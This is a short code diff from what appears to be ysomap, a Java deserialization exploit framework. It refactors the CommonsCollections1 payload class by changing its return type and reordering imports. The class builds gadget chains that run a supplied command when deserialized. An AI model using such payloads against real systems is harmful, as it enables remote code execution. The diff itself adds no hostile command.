@@ -8,9 +8,9 @@ import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.annotation.Payloads;
 import ysomap.annotation.Require;
-import ysomap.core.ObjectGadget;
-import ysomap.core.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
+import ysomap.core.bean.Bullet;
 import ysomap.core.bean.Payload;
+import ysomap.core.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.util.PayloadHelper;
 import ysomap.util.ReflectionHelper;
 
@@ -54,8 +54,9 @@ public class CommonsCollections1 extends Payload<InvocationHandler> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) throws Exception {
-        return new TransformerWithTemplatesImplBullet().set("args",command);
+    public Bullet getDefaultBullet(String command) throws Exception {
+        return new TransformerWithTemplatesImplBullet()
+                .set("args",command);
     }
 
 }
